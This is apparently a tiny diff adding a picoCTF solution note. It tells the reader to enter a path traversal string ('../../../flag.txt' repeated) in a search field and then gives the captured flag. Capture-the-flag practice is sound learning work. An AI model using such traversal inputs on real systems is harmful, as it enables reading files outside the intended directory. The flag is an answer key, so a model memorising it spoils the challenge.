@@ -1,0 +1,3 @@
+In the search field put the following: ../../../../../../../../../flag.txt
+
+picoCTF{7h3_p47h_70_5ucc355_6db46514}
